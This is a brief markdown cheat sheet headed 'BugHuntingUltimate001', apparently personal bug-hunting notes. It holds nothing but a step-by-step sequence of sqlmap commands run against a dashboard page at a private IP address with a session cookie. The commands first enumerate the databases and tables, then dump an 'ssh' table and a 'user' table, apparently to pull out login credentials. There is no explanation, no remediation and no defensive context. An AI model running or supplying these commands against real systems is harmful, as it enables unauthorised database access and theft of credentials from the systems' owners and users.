# BugHuntingUltimate001


## SQL Injection
''
sqlmap -u "http://172.168.252.252/dashboard.php?id=1" --cookie="PHPSESSID=xyzabcd" --dbs --batch

next find the database name

sqlmap -u "http://172.168.252.252/dashboard.php?id=1" --cookie="PHPSESSID=xyzabcd" -D example_data --tables --batch

then if ssh enable

sqlmap -u "http://172.168.252.252/dashboard.php?id=1" --cookie="PHPSESSID=xyzabcd" -D example_data -T ssh --columns --batch

sqlmap -u "http://172.168.252.252/dashboard.php?id=1" --cookie="PHPSESSID=xyzabcd" -D example_data -T ssh --columns --dump --batch

sqlmap -u "http://172.168.252.252/dashboard.php?id=1" --cookie="PHPSESSID=xyzabcd" -D example_data -T user --columns --dump --batch
''
